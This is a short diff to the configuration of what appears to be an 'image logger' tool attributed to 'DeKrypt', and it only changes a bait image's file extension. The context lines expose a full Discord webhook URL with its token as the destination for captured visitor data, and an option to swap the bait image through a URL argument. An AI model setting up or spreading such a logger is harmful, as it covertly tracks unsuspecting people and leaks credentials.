@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1482034579543163054/Ks2zIflkZAxNg4GGu2nrN3XGu9UVS3tIMCcJxtCSypaFBDZdEdK1-32gqmHL5wktrf-w",
-    "image": "https://us.123rf.com/450wm/markrademaker/markrademaker2204/markrademaker220400112/184820205-you-have-been-hacked-vector-hacker-icon-or-pictogram-key-logger-cyber-security-concept.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://us.123rf.com/450wm/markrademaker/markrademaker2204/markrademaker220400112/184820205-you-have-been-hacked-vector-hacker-icon-or-pictogram-key-logger-cyber-security-concept.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
